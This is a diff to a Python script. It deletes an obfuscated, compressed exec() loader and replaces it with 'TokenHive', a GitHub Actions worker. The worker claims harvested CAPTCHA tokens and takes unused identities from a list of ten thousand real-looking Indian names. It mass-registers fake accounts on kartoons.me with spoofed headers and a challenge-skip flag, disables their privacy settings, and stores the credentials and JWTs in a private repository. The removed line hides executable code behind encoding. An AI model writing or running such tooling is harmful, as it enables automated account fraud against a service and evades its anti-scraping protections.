@@ -1,2 +1,360 @@
-import zlib as _z, base64 as _b
-exec(compile(_z.decompress(_b.b64decode('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')), '<kts>', 'exec'))
+#!/usr/bin/env python3
+"""TokenHive v3.2 — WORKER (kts-mailbox-2..-5) — 1 token/run.
+
+Trigger: repository_dispatch "register" (hub dispatch karta hai).
+Flow: inbox se 1 fresh token ATOMIC claim → 1 UNUSED Indian identity (10k
+names.txt) se register → JWT milte hi privacy settings OFF (4 settings) →
+JWT → PRIVATE repo (Jts-Brain) tokenhive/tokens_YYYY-MM-DD.txt → identity
+used_ids.txt me mark. No token = clean exit.
+
+Uniqueness: used_ids.txt (hub) — same info same run me NAHI, alag repos me
+NAHI (422 race pe 3x auto-retry naye identity se).
+"""
+import json, os, random, re, string, time, urllib.request, urllib.error, base64
+
+GH_PAT = os.environ.get("GH_PAT", "")
+HUB_REPO = (os.environ.get("HUB_REPO", "") or "voughtx/kts-mailbox").strip()
+PRIVATE_REPO = os.environ.get("PRIVATE_REPO", "voughtx/Jts-Brain")
+SIBLINGS = [s.strip() for s in os.environ.get("SIBLINGS", "").split(",") if s.strip()]
+RUNNER_ID = os.environ.get("RUNNER_ID", "kts-mailbox")
+NAMES_URL = os.environ.get("NAMES_URL", f"https://raw.githubusercontent.com/{HUB_REPO}/main/names.txt")
+TOKEN = os.environ.get("TOKEN", "")          # manual dispatch me optional fresh token
+MAX_AGE = 240                                 # 4 min fresh turnstile
+GAP_PRIVACY_RETRY = 20                        # s
+ID_RETRY = 3                                  # 422 pe naye identity se tries
+WAVE_SETTLE_S = 75                            # siblings ko claim hone ka waqt
+LOCK_FILE = "runner_lock.txt"
+LOCK_TTL = 900
+UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36"
+HDRS = {"User-Agent": UA, "Content-Type": "application/json",
+        "Origin": "https://kartoons.me", "Referer": "https://kartoons.me/",
+        "X-Skip-Challenge": "true"}
+
+
+def api(extra=None):
+    h = {"Authorization": "token " + GH_PAT, "User-Agent": "kts-runner",
+         "Accept": "application/vnd.github+json"}
+    if extra: h.update(extra)
+    return h
+
+
+def gh_get(repo, path):
+    rq = urllib.request.Request(f"https://api.github.com/repos/{repo}/contents/{path}",
+                                headers=api())
+    try:
+        with urllib.request.urlopen(rq, timeout=20) as r:
+            d = json.loads(r.read().decode())
+            return d.get("sha"), base64.b64decode(d["content"]).decode(errors="ignore")
+    except urllib.error.HTTPError as e:
+        if e.code == 404:
+            return None, ""
+        raise
+
+
+def gh_put(repo, path, content, sha=None):
+    data = {"message": "tokenhive update", "content": base64.b64encode(content.encode()).decode()}
+    if sha: data["sha"] = sha
+    rq = urllib.request.Request(f"https://api.github.com/repos/{repo}/contents/{path}",
+                                data=json.dumps(data).encode(), method="PUT",
+                                headers=api({"Content-Type": "application/json"}))
+    try:
+        with urllib.request.urlopen(rq, timeout=20) as r:
+            return r.status in (200, 201)
+    except urllib.error.HTTPError as e:
+        if e.code in (409, 423):
+            return False
+        raise
+
+
+def gh_append(repo, path, record, header_if_new=""):
+    """atomic append (sha-conditional, 6 retry)."""
+    for _ in range(6):
+        try:
+            sha, old = gh_get(repo, path)
+        except Exception:
+            sha, old = None, ""
+        new = (old.rstrip("\n") + "\n" + record if old.strip() else (header_if_new + record).lstrip("\n"))
+        if gh_put(repo, path, new.rstrip("\n") + "\n", sha):
+            return True
+        time.sleep(1.2 + random.random())
+    return False
+
+
+# ---------------- inbox: token claim ----------------
+
+def fresh_entries(content):
+    now = time.time()
+    out = []
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if ":" in line[:12]:
+            ep_s, tok = line.split(":", 1)
+            if ep_s.isdigit() and now - int(ep_s) <= MAX_AGE:
+                out.append((int(ep_s), tok))
+        else:
+            out.append((int(now), line))
+    out.sort(reverse=True)
+    return out
+
+
+def inbox_lines(content):
+    return [l for l in content.splitlines() if l.strip() and not l.strip().startswith("#")]
+
+
+def claim_1(tok_override=None):
+    if tok_override:
+        return tok_override
+    for _ in range(10):
+        sha, content = gh_get(HUB_REPO, "inbox.txt")
+        entries = fresh_entries(content)
+        if not entries:
+            return None
+        want = entries[0][1]
+        keep = [l for l in content.splitlines()
+                if l.strip() and l.strip() not in ("#" + l.strip())
+                and not (l.strip().endswith(want) or l.strip() == want)]
+        # expired lines bhi clean karte jaao (v3.1 jaisa)
+        new_c = "\n".join(keep) + "\n"
+        if gh_put(HUB_REPO, "inbox.txt", new_c, sha):
+            return want
+        time.sleep(1.2 + random.random())
+    return None
+
+
+def inbox_fresh_count():
+    try:
+        _, content = gh_get(HUB_REPO, "inbox.txt")
+        return len(fresh_entries(content))
+    except Exception:
+        return 0
+
+
+def wave_marker():
+    line = "# wave " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " by " + RUNNER_ID
+    sha, content = gh_get(HUB_REPO, "inbox.txt")
+    new_c = content.rstrip("\n") + "\n" + line + "\n"
+    return gh_put(HUB_REPO, "inbox.txt", new_c, sha)
+
+
+# ---------------- names: 10k Indian identities ----------------
+
+_NAMES = []
+
+def load_names():
+    global _NAMES
+    if _NAMES:
+        return _NAMES
+    try:
+        rq = urllib.request.Request(NAMES_URL, headers={"User-Agent": "kts-runner"})
+        content = urllib.request.urlopen(rq, timeout=25).read().decode(errors="ignore")
+    except Exception as e:
+        print("names load err:", str(e)[:80], flush=True)
+        return []
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith("S.No.") or line.startswith("="):
+            continue
+        parts = [p.strip() for p in line.split("\t")]
+        if len(parts) >= 6:
+            uname, full = parts[4], parts[1]
+        elif len(parts) == 1 and "@" in line:
+            uname = line.split("@")[0]
+            full = " ".join(w.capitalize() for w in uname.replace(".", " ").replace("_", " ").split()[:2]) or uname
+        else:
+            continue
+        if re.fullmatch(r"[a-zA-Z][a-zA-Z0-9._-]{2,}", uname):
+            uname = uname.replace(".", "_")
+            _NAMES.append((uname, full))
+    return _NAMES
+
+
+def used_ids():
+    try:
+        _, c = gh_get(HUB_REPO, "used_ids.txt")
+        return set(l.strip() for l in c.splitlines() if l.strip())
+    except Exception:
+        return set()
+
+
+def pick_identity(used):
+    names = load_names()
+    fresh = [n for n in names if n[0] not in used]
+    if not fresh:
+        return None
+    return random.choice(fresh)
+
+
+def mark_used(uname):
+    gh_append(HUB_REPO, "used_ids.txt", uname)
+
+
+# ---------------- register + privacy + save ----------------
+
+def register(tok, uname, full_name):
+    password = "P@ss" + "".join(random.choices(string.ascii_letters + string.digits, k=14)) + "!"
+    email = f"{uname}@gmail.com"
+    body = json.dumps({"username": uname, "password": password,
+                       "email": email, "turnstile_token": tok}).encode()
+    rq = urllib.request.Request("https://api.kartoons.me/api/auth/register",
+                                data=body, method="POST", headers=HDRS)
+    try:
+        with urllib.request.urlopen(rq, timeout=30) as resp:
+            d = json.loads(resp.read().decode())
+            dd = d.get("data") or {}
+            jwt = dd.get("access_token") or dd.get("token") or dd.get("jwt")
+            return {"ok": True, "username": uname, "full_name": full_name,
+                    "password": password, "email": email,
+                    "jwt": jwt or "", "status": resp.status}, None
+    except urllib.error.HTTPError as e:
+        return None, f"HTTP {e.code}: {e.read().decode()[:300]}"
+
+
+def prep_privacy(jwt):
+    """4 settings OFF (KTS _prep_privacy wala exact body).
+    Returns: 'ok' | 'banned' | 'pending'"""
+    body = json.dumps({"watchlist_public": False, "activity_public": False,
+                       "currently_watching_public": False, "watch_time_public": False}).encode()
+    for attempt in range(2):
+        try:
+            rq = urllib.request.Request("https://api.kartoons.me/api/user/privacy",
+                                        data=body, method="PUT",
+                                        headers={**HDRS, "Authorization": "Bearer " + jwt})
+            with urllib.request.urlopen(rq, timeout=20) as r:
+                b = r.read().decode()[:200]
+                if r.status == 200 and '"success":true' in b.replace(" ", ""):
+                    return "ok"
+                low = b.lower()
+                if r.status in (401, 403) and ("banned" in low or "scraping" in low):
+                    return "banned"
+        except urllib.error.HTTPError as e:
+            b = e.read().decode()[:200]
+            low = b.lower()
+            if e.code in (401, 403) and ("banned" in low or "scraping" in low):
+                return "banned"
+            print(f"  privacy HTTP {e.code} (attempt {attempt+1})", flush=True)
+        except Exception as e:
+            print("  privacy err:", str(e)[:60], flush=True)
+        if attempt == 0:
+            time.sleep(GAP_PRIVACY_RETRY)
+    return "pending"
+
+
+def save_token(acc, privacy_state):
+    datefile = "tokenhive/tokens_" + time.strftime("%Y-%m-%d", time.gmtime()) + ".txt"
+    rec = (f"\n===\nusername: {acc['username']}\nfull_name: {acc['full_name']}\n"
+           f"password: {acc['password']}\nemail: {acc['email']}\n"
+           f"jwt: {acc['jwt']}\nprivacy: {privacy_state}\n"
+           f"source: {RUNNER_ID}\n")
+    return gh_append(PRIVATE_REPO, datefile, rec)
+
+
+def update_status():
+    try:
+        datefile = "tokenhive/tokens_" + time.strftime("%Y-%m-%d", time.gmtime()) + ".txt"
+        sha, today = gh_get(PRIVATE_REPO, datefile)
+        n = today.count("username:")
+        gh_put(PRIVATE_REPO, "tokenhive/runner_status.txt",
+               f"last_run: {time.strftime('%Y-%m-%dT%H:%MZ', time.gmtime())}\n"
+               f"runner: {RUNNER_ID}\ntoday_jwts: {n}", None)
+    except Exception as e:
+        print("status fail:", str(e)[:60], flush=True)
+
+
+# ---------------- lock (hub only) ----------------
+
+def acquire_lock():
+    run_id = os.environ.get("GITHUB_RUN_ID", str(os.getpid()))
+    for _ in range(3):
+        try:
+            sha, content = gh_get(HUB_REPO, LOCK_FILE)
+            held = False
+            if content.strip():
+                try:
+                    if float(content.strip().split("|")[0]) > time.time():
+                        held = True
+                except Exception:
+                    pass
+            if held:
+                print("[lock] doosra hub run active — exit", flush=True)
+                return False
+            if gh_put(HUB_REPO, LOCK_FILE, f"{time.time() + LOCK_TTL}|{run_id}|{time.time()}", sha):
+                return True
+        except Exception as e:
+            print("lock err:", str(e)[:60], flush=True)
+        time.sleep(5)
+    return False
+
+
+def release_lock():
+    try:
+        sha, _ = gh_get(HUB_REPO, LOCK_FILE)
+        if sha:
+            gh_put(HUB_REPO, LOCK_FILE, "", sha)
+    except Exception:
+        pass
+
+
+# ---------------- main ----------------
+
+def do_register_cycle(tok):
+    """1 token + 1 identity → register → privacy → save → used. Returns True on success."""
+    used = used_ids()
+    for attempt in range(ID_RETRY):
+        ident = pick_identity(used)
+        if not ident:
+            print("names exhausted", flush=True)
+            return False
+        uname, full = ident
+        used.add(uname)
+        print(f"try {attempt+1}/{ID_RETRY}: {uname} ({full})...", flush=True)
+        acc, err = register(tok, uname, full)
+        if err or not acc or not acc.get("jwt"):
+            print("  register fail:", (err or "no jwt")[:160], flush=True)
+            if err and "422" in err:
+                continue          # naye identity se retry (username collision)
+            return False
+        priv = prep_privacy(acc["jwt"])
+        print(f"  ✅ {uname} | privacy: {priv}", flush=True)
+        if priv == "banned":
+            print("  ❌ token banned register-time — save NAHI hoga", flush=True)
+            mark_used(uname)
+            return False
+        if save_token(acc, priv):
+            mark_used(uname)
+            update_status()
+            return True
+        print("  ⚠ save fail — token log me hai (manually save karna)", flush=True)
+        print("  DATA: " + json.dumps({k: acc[k] for k in ("username", "password", "email", "jwt", "full_name")}, flush=True))
+        return False
+    return False
+
+
+def dispatch(repo):
+    try:
+        data = json.dumps({"event_type": "register"}).encode()
+        rq = urllib.request.Request(f"https://api.github.com/repos/{repo}/dispatches",
+                                    data=data, method="POST",
+                                    headers=api({"Content-Type": "application/json"}))
+        with urllib.request.urlopen(rq, timeout=20) as r:
+            return r.status == 204
+    except Exception:
+        return False
+
+
+def main():
+    print(f"WORKER {RUNNER_ID} | IP:", urllib.request.urlopen("https://api.ipify.org", timeout=10).read().decode().strip(), flush=True)
+
+    if TOKEN:
+        # manual mode
+        do_register_cycle(TOKEN)
+        return
+
+    tok = claim_1()
+    if not tok:
+        print("no fresh token in inbox — done", flush=True)
+        return
+    print("claimed 1 token", flush=True)
+    do_register_cycle(tok)
+    print("done", flush=True)
